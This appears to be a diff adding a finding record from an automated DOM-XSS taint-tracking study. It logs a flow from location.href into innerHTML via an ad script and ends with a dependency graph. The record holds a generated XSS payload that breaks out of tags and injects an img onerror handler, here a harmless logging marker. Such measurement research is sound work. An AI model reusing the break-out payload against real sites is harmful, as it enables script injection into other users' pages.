@@ -1,0 +1,86 @@
+// Finding: 8c8f433e-3135-4774-bde0-84cebb3f3622
+// Finding.url: https://www.example80.com/ott/people/people-every-day-trisha-yearwood/video_5546ddf0-7594-562c-a11b-c89ff64e3edd.html?ff64e3edd.html%3Fblock_id%3D980754"></iframe></style></script></object></embed></textarea><img src=x onerror=taintfoxLog('025a0a14d6de4f5598009b31ad4f4d10')><!--/*
+// Finding.parentloc: https://www.example80.com/ott/people/people-every-day-trisha-yearwood/video_5546ddf0-7594-562c-a11b-c89ff64e3edd.html?ff64e3edd.html%3Fblock_id%3D980754"></iframe></style></script></object></embed></textarea><img src=x onerror=taintfoxLog('025a0a14d6de4f5598009b31ad4f4d10')><!--/*
+// Finding.domain: www.example80.com
+// Finding.base_domain: example80.com
+// Finding.source: location.href
+// Finding.sink: innerHTML
+// Sanitizer.score: 3
+// Sanitizer.name: RubiconAdServing.RubiconAd/this.start
+// Sanitizer.location: https://ads.example81.com/ad/11430.js - RubiconAdServing.RubiconAd/this.start:1:15461
+// Finding.begin: 133
+// Finding.end: 470
+// Finding.original_uuid: 359d7c00-cad8-472c-b533-c5dc408b9e3a
+// Finding.TwentyFiveMillionFlowsId: 463228722
+// Finding.script: https://example82.com/script.js line 1 > eval
+// Finding.line: 1
+// Exploit.uuid: 025a0a14-d6de-4f55-9800-9b31ad4f4d10
+// Exploit.success: false
+// Exploit.status: validated
+// Exploit.method: C
+// Exploit.type: html
+// Exploit.token: attribute
+// Exploit.content: src
+// Exploit.quote_type: "
+// Exploit.tag: script
+// Exploit.break_out: ff64e3edd.html%3Fblock_id%3D980754"></iframe></style></script></object></embed></textarea><img src=x onerror=
+// Exploit.break_in: ><!--/*
+// Exploit.payload: ff64e3edd.html%3Fblock_id%3D980754"></iframe></style></script></object></embed></textarea><img src=x onerror=taintfoxLog(1)><!--/*
+// Exploit.begin_taint_url: 0
+// Exploit.end_taint_url: 129
+// Exploit.replace_begin_url: 114
+// Exploit.replace_end_url: 129
+// Exploit.replace_begin_param: 279
+// Exploit.replace_end_param: 313
+// Issues.LargestEncodeAttrStringChain: 0
+// Issues.LargestTextFragmentEncodeChainLength: 0
+// Issues.HasApproximation: false
+// Issues.HasMissingImplementation: false
+// Issues.HasInfiniteRegexWithFunctionReplacer: false
+// Issues.MergedSplitAndJoins: false
+// Issues.HasUrlInRhsOfReplace: true
+// Issues.HasUrlInLhsOfReplace: false
+// Issues.HasCookieValueInLhsOfreplace: false
+// Issues.HasCookieValueInRhsOfreplace: false
+// Issues.HasCookieValueInMatchPattern: false
+// Issues.HasCookieValueInExecPattern: false
+// Issues.RemovedLRConcats: false
+// Issues.RemovedReplaceArtifacts: false
+// Issues.HasUrlInMatchPattern: false
+// Issues.HasUrlInExecPattern: false
+// Issues.RemovedNOPreplaces: false
+// Issues.Known_sanitizer: false
+// DepGraph.hash: 1880002555
+// DepGraph.sanitizer_hash: 1761578589
+// Part of the URL ('&rf=https%3A//www.example80.com/ott/people/people-every-day-trisha-yearwood/video_5546ddf0-7594-562c-a11b-c89ff64e3edd.html%3Fff64e3edd.html%253Fblock_id%253D980754%22%3E%3C/iframe%3E%3C/style%3E%3C/script%3E%3C/object%3E%3C/embed%3E%3C/textarea%3E%3Cimg%20src%3Dx%20onerror%3DtaintfoxLog%28%27025a0a14d6de4f5598009b31ad4f4d10%27%29%3E%3C%21--/*') found in right hand side of replace 
+digraph cfg {
+n0 [shape=house, label="Input: x"];
+n1 [shape=ellipse, label="escape"];
+n2 [shape=box, label="Var: x"];
+n3 [shape=ellipse, label="."];
+n4 [shape=box, label="Lit: &rf="];
+n5 [shape=ellipse, label="str_replace_once"];
+n6 [shape=box, label="Lit: $referrer$"];
+n7 [shape=box, label="Lit: &rf=https%3A//www.example80.com/ott/people/people-every-day-trisha-yearwood/video_5546ddf0-7594-562c-a11b-c89ff64e3edd.html%3Fff64e3edd.html%253Fblock_id%253D980754%22%3E%3C/iframe%3E%3C/style%3E%3C/script%3E%3C/object%3E%3C/embed%3E%3C/textarea%3E%3Cimg%20src%3Dx%20onerror%3DtaintfoxLog%28%27025a0a14d6de4f5598009b31ad4f4d10%27%29%3E%3C%21--/*"];
+n8 [shape=box, label="Var: x"];
+n9 [shape=ellipse, label="str_replace_once"];
+n10 [shape=box, label="Lit: $aso$"];
+n11 [shape=box, label="Lit: &p_pos=atf"];
+n12 [shape=box, label="Var: x"];
+n13 [shape=box, label="Var: x"];
+n14 [shape=doubleoctagon, label="Return: x"];
+n2 -> n0;
+n1 -> n2;
+n3 -> n4;
+n3 -> n1;
+n8 -> n3;
+n5 -> n6;
+n5 -> n7;
+n5 -> n8;
+n12 -> n5;
+n9 -> n10;
+n9 -> n11;
+n9 -> n12;
+n13 -> n9;
+n14 -> n13;
+}
